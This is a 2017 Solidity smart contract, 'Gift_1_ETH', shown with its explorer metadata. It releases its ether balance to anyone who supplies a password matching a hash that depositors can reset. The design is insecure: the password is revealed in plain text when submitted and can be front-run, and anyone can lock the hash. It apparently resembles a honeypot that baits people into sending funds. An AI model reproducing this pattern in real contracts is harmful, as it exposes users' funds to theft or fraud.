
//Address: 0xd8993f49f372bb014fb088eabec95cfdc795cbf6
//Contract name: Gift_1_ETH
//Balance: 0 Ether
//Verification Date: 10/29/2017
//Transacion Count: 6

// CODE STARTS HERE

pragma solidity ^0.4.17;

contract Gift_1_ETH
{
    bool passHasBeenSet = false;
    
    function()payable{}
    
    function GetHash(bytes pass) constant returns (bytes32) {return sha3(pass);}
    
    bytes32 public hashPass;
    
    function SetPass(bytes32 hash)
    payable
    {
        if(!passHasBeenSet&&(msg.value >= 1 ether))
        {
            hashPass = hash;
        }
    }
    
    function GetGift(bytes pass)
    {
        if(hashPass == sha3(pass))
        {
            msg.sender.transfer(this.balance);
        }
    }
    
    function PassHasBeenSet(bytes32 hash)
    {
        if(hash==hashPass)
        {
           passHasBeenSet=true;
        }
    }
}
